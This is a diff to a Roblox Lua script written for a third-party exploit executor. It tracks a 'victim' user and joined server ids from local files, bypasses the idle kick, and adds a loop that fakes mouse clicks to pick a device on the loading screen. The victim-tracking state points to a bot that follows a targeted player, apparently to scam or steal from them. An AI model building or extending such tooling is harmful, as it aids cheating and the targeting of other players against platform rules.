@@ -15,6 +15,7 @@ game:service "Players".LocalPlayer.Idled:connect(
 )
 
 local HttpServ = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local victimFile = isfile("user.txt")
 local joinedFile = isfile("joined_ids.txt")
 if not victimFile then
@@ -27,6 +28,25 @@ local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
 local didVictimLeave = false
 local timer = 0
+
+local function selectDevice()
+    while task.wait(0.1) do
+        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
+        if DeviceSelectGui then
+            local Container = DeviceSelectGui:WaitForChild("Container")
+            local Mouse = game.Players.LocalPlayer:GetMouse()
+            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
+            local buttonPos = button.AbsolutePosition
+            local buttonSize = button.AbsoluteSize
+            local centerX = buttonPos.X + buttonSize.X / 2
+            local centerY = buttonPos.Y + buttonSize.Y / 2
+            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
+            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
+        end
+    end
+end
+
+task.spawn(selectDevice)
 
 local loadingScreen = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2'):WaitForChild('Loading')
 while loadingScreen.Enabled do
